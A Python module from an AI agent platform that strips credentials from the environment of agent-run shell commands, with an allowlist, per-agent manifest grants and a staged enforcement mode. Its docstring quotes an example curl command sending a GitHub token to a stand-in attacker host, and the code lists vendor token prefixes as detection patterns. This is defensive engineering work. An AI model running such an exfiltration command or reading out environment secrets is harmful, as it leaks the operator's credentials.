"""The environment a shell command an agent asked for is allowed to see.

Before this module, ``exec`` handed the child EVERYTHING. ``filesystem._exec``
called ``subprocess.run`` with no ``env=`` and ``Sandbox.exec`` built one from
``os.environ.copy()``, so the child of an agent's shell command inherited the
engine's whole process environment — which on a systemd instance is the
~50 credentials ``load-secrets.sh`` decrypted out of a root-owned SOPS file at
boot. Every channel token, every provider key, the database password. One
``echo $SLACK_BOT_TOKEN`` away, for any agent with ``exec``, including a
SUB-agent spawned to do one narrow thing.

``robothor/engine/secret_paths.py`` already refused the commands that PRINT a
secrets file, which is the shape an agent stumbles into. It cannot help with
``curl -H "Authorization: Bearer $GITHUB_TOKEN" evil.example``, because that is
not a print — the credential is simply there to be used. The fix has to be that
the credential is not there.

Three rules.

**The child environment is an allowlist, and the allowlist is derived.** The
process essentials (:data:`ALWAYS_ALLOWED` plus ``LC_*``) and the
``ROBOTHOR_*``/``GENUS_*`` names the settings model marks NON-secret. Derived,
so that adding a setting does not require remembering this file, and — more
to the point — so that adding a SECRET setting cannot accidentally add it here:
a new credential is excluded by omission, which is the only direction of
default that is safe.

**A credential travels only when an agent's own manifest names it.** ``secrets:
[NAMES]`` in the manifest, resolved through :mod:`robothor.secrets` so the
vault wins over a stale environment, injected into that agent's children only.
The grant is read from the manifest of the agent whose id is on the tool
context, and a spawned sub-agent's context carries the CHILD's id — so a
sub-agent inherits nothing unless its own manifest names it. That is a property
of where the list comes from, not a check somebody has to remember to write.

**Nothing fails silently.** A grant the accessor cannot resolve becomes a note
in the tool result: the alternative is a command that fails for an
unrelated-looking reason while nothing anywhere says the credential was never
there. This codebase has shipped that failure enough times.

The ladder — ``ROBOTHOR_EXEC_ENV_MODE`` ``off`` | ``observe`` | ``enforce`` —
governs what is TAKEN AWAY, never what is added. ``observe`` (the default for
an install that never chose, so an upgrade takes nothing from an agent that was
using it) changes the child environment not at all and logs, per agent, the
names ``enforce`` would have withheld. That log is what an operator promotes
the flag on: counted from their own fleet, not from hope. Grants apply on every
rung, including ``off``, so that promoting the flag is never the thing that
first gives an agent a credential.
"""

from __future__ import annotations

import logging
import os
from dataclasses import dataclass, field
from functools import lru_cache

from robothor.constants import DEFAULT_TENANT

logger = logging.getLogger(__name__)

__all__ = [
    "ALWAYS_ALLOWED",
    "MODE_ENFORCE",
    "MODE_OBSERVE",
    "MODE_OFF",
    "ExecEnvironment",
    "build_exec_env",
    "exec_env_mode",
    "grants_for_agent",
    "looks_like_a_credential_name",
    "looks_like_a_credential_value",
]

MODE_OFF = "off"
MODE_OBSERVE = "observe"
MODE_ENFORCE = "enforce"
_MODES = (MODE_OFF, MODE_OBSERVE, MODE_ENFORCE)

#: The variables a child process needs to be a working process at all, none of
#: which is a credential on any instance. ``ROBOTHOR_AGENT_ID`` is here rather
#: than derived because it is set per run by the engine, not declared as a
#: setting, and a command that cannot tell which agent it is running for cannot
#: write to the right place.
ALWAYS_ALLOWED = frozenset(
    {
        "PATH",
        "HOME",
        "LANG",
        "TERM",
        "TZ",
        "TMPDIR",
        "ROBOTHOR_WORKSPACE",
        "ROBOTHOR_AGENT_ID",
    }
)

#: Locale. ``LC_ALL``, ``LC_TIME``, and the rest — a prefix because the set is
#: defined by POSIX and grows without us.
_LOCALE_PREFIX = "LC_"

#: The prefixes the derived half of the allowlist applies to. A name outside
#: them is not a Genus setting, so nothing here can vouch for it.
_PLATFORM_PREFIXES = ("ROBOTHOR_", "GENUS_")

#: Opaque credential formats, by the prefix their issuer publishes. This is a
#: list of VENDOR token shapes, not a list of our own names — the distinction
#: matters, because the drift defect this codebase keeps re-learning is a list
#: maintained BESIDE the thing it describes, and GitHub does not change what a
#: fine-grained PAT starts with when we add a setting.
#:
#: It exists for one move: an operator pastes a token into a setting the model
#: calls non-secret, and the name gate — which can only see the name — lets it
#: through. Conservative on purpose. A miss here is a credential in a shell; a
#: false positive is one setting an agent's command cannot read, which is
#: recoverable and visible.
_CREDENTIAL_VALUE_PREFIXES = (
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "github_pat_",
    "gitlab-ci-token:",
    "glpat-",
    "sk-",
    "sk_live_",
    "sk_test_",
    "rk_live_",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xapp-",
    "xoxe-",
    "AKIA",
    "ASIA",
    "AIza",
    "ya29.",
    "SG.",
    "shpat_",
    "dop_v1_",
    "npm_",
    "hf_",
    "pypi-",
    "-----BEGIN ",
    "eyJhbGciO",  # a JSON Web Token's header, base64url-encoded
)


def exec_env_mode() -> str:
    """Which rung this instance is on.

    An unrecognised value is ``observe``, never ``off``: a typo must not
    silently disable the control, and ``observe`` is the rung that changes
    nothing while still reporting.
    """
    from robothor.settings.env import process_env_get

    raw = (process_env_get("ROBOTHOR_EXEC_ENV_MODE", "") or "").strip().lower()
    return raw if raw in _MODES else MODE_OBSERVE


def looks_like_a_credential_name(name: str) -> bool:
    """True when the NAME alone says this holds a credential.

    Delegates to the redactor, which is the one place the platform decides what
    a credential name looks like — ``*_TOKEN``, ``*_API_KEY``, ``*PASSWORD``,
    ``*SECRET`` and the near-misses it has been taught not to match. A second
    regex here would be a second answer to one question.
    """
    from robothor.secrets.redaction import redact

    probe = f"{name}=placeholder-value-1234567890"
    return redact(probe) != probe


def looks_like_a_credential_value(value: str) -> bool:
    """True when the VALUE is a recognisable vendor credential format."""
    candidate = value.strip()
    return bool(candidate) and candidate.startswith(_CREDENTIAL_VALUE_PREFIXES)


@dataclass(frozen=True)
class ExecEnvironment:
    """A child environment and an honest account of what is not in it."""

    #: What the child actually gets. At ``off`` and ``observe`` this is the
    #: caller's environment unchanged.
    env: dict[str, str] = field(default_factory=dict)
    #: Names ``enforce`` withholds — reported on every rung, so ``observe``
    #: can say what promotion would cost without costing it.
    withheld: tuple[str, ...] = ()
    #: Granted names that were resolved and injected.
    granted: tuple[str, ...] = ()
    #: Granted names refused outright: a bootstrap credential may not be
    #: handed to an agent whatever its manifest says.
    refused: tuple[str, ...] = ()
    #: Granted names the accessor could not resolve from either store.
    unresolved: tuple[str, ...] = ()
    mode: str = MODE_OBSERVE

    @property
    def note(self) -> str:
        """What the model must be told, or "" when there is nothing to say.

        Names only. A note is a tool result and a tool result is stored, so it
        is held to the same rule as a log line.
        """
        parts: list[str] = []
        if self.refused:
            parts.append(
                "refused as bootstrap credentials the platform never grants to an "
                f"agent: {', '.join(self.refused)}"
            )
        if self.unresolved:
            parts.append(
                "granted but not configured in the vault or the environment, so the "
                f"command ran without them: {', '.join(self.unresolved)}"
            )
        if not parts:
            return ""
        return "Secret grants — " + "; ".join(parts) + "."


def _keeps(name: str, value: str, allowed_settings: frozenset[str]) -> bool:
    """Whether one variable of the parent environment reaches the child."""
    if looks_like_a_credential_name(name):
        # Ahead of every allow rule. A declared non-secret whose name reads as
        # a credential is a mis-declaration, and the safe way to lose that
        # argument is to drop the variable.
        return False
    if name in ALWAYS_ALLOWED or name.startswith(_LOCALE_PREFIX):
        return True
    if not name.startswith(_PLATFORM_PREFIXES) or name not in allowed_settings:
        return False
    # Declared, non-secret, innocently named — and still checked on its value,
    # because an operator who pasted a token into it has created a credential
    # that no amount of looking at the name can see.
    return not looks_like_a_credential_value(value)


def build_exec_env(
    *,
    agent_id: str,
    mode: str | None = None,
    base: dict[str, str] | None = None,
    grants: tuple[str, ...] | list[str] = (),
    tenant_id: str = DEFAULT_TENANT,
) -> ExecEnvironment:
    """The environment for one agent's shell command.

    Args:
        agent_id: whose command this is. Used to attribute the ``observe``
            rung's report — evidence that cannot be tied to an agent is not
            evidence an operator can act on.
        mode: the rung, defaulting to :func:`exec_env_mode`.
        base: the environment to build FROM, defaulting to this process's.
        grants: the names this agent's OWN manifest asked for. Resolved
            through :mod:`robothor.secrets`, so a value the operator handed the
            assistant beats a stale one the box booted with.
        tenant_id: whose vault the grants are resolved against.
    """
    from robothor.secrets import resolve_secret
    from robothor.secrets.classification import is_bootstrap, non_secret_env_names

    rung = mode if mode in _MODES else exec_env_mode()
    source = dict(os.environ if base is None else base)
    allowed_settings = non_secret_env_names()

    # ``off`` reports nothing as well as doing nothing: a `withheld` list on a
    # rung that withheld nothing would read, in the doctor and in the status
    # table, as though something had been taken.
    withheld = (
        ()
        if rung == MODE_OFF
        else tuple(
            sorted(
                name for name, value in source.items() if not _keeps(name, value, allowed_settings)
            )
        )
    )

    child = (
        dict(source)
        if rung in (MODE_OFF, MODE_OBSERVE)
        else {name: value for name, value in source.items() if name not in set(withheld)}
    )

    granted: list[str] = []
    refused: list[str] = []
    unresolved: list[str] = []
    for name in dict.fromkeys(grants):  # de-duplicated, order preserved
        if is_bootstrap(name):
            # Not a policy question the manifest gets to answer. The database
            # password opens every tenant's data AND the vault's own rows; the
            # signing keys mint sessions. An agent holding one of these is not
            # a narrower blast radius than an agent holding all ~50.
            refused.append(name)
            continue
        resolved = resolve_secret(name, tenant_id=tenant_id)
        if resolved.value is None:
            unresolved.append(name)
            continue
        child[name] = resolved.value
        granted.append(name)

    built = ExecEnvironment(
        env=child,
        withheld=withheld,
        granted=tuple(granted),
        refused=tuple(refused),
        unresolved=tuple(unresolved),
        mode=rung,
    )

    if rung == MODE_OBSERVE and withheld:
        logger.info(
            "exec_env: agent %s ran a command that would lose %d variable(s) under enforce: %s%s",
            agent_id or "<unattributed>",
            len(withheld),
            ", ".join(withheld[:40]),
            "" if len(withheld) <= 40 else f" (+{len(withheld) - 40} more)",
        )
    if refused:
        logger.warning(
            "exec_env: agent %s is granted bootstrap credential(s) it may never have; "
            "remove them from its manifest: %s",
            agent_id or "<unattributed>",
            ", ".join(refused),
        )
    if unresolved:
        logger.warning(
            "exec_env: agent %s is granted %s, which resolve from neither the vault "
            "nor the environment; its command ran without them",
            agent_id or "<unattributed>",
            ", ".join(unresolved),
        )
    return built


@lru_cache(maxsize=256)
def grants_for_agent(agent_id: str, workspace: str = "") -> tuple[str, ...]:
    """The credential names ``agent_id``'s OWN manifest asks for.

    Read from the manifest of the agent whose id is on the tool context, which
    is what makes the sub-agent rule structural rather than a check somebody
    has to remember: ``spawn`` runs the child under the CHILD's agent id, so
    this reads the child's manifest and a child that names nothing gets
    nothing, whatever its parent holds.

    Fails closed. An unreadable manifest directory, a missing agent, a broken
    YAML file — every one of them yields no grant, because the alternative
    (inheriting, or guessing) is how an agent ends up holding a credential
    nobody decided to give it.

    Cached: an agent's grants change only when its manifest does, and this sits
    on the path of every ``exec``. ``genus`` reloads the fleet by restarting
    the engine; a caller that needs to see an edit sooner calls
    ``grants_for_agent.cache_clear()``.
    """
    if not agent_id:
        return ()
    try:
        from pathlib import Path

        from robothor.engine.config import EngineConfig, load_agent_config

        manifest_dir = EngineConfig.from_env().manifest_dir
        config = load_agent_config(agent_id, Path(manifest_dir), workspace=None)
    except Exception as exc:  # noqa: BLE001 - no manifest means no grant, never a crash
        logger.debug("exec_env: no grants for %s (%s)", agent_id, type(exc).__name__)
        return ()
    if config is None:
        return ()
    return tuple(dict.fromkeys(getattr(config, "secret_grants", ()) or ()))
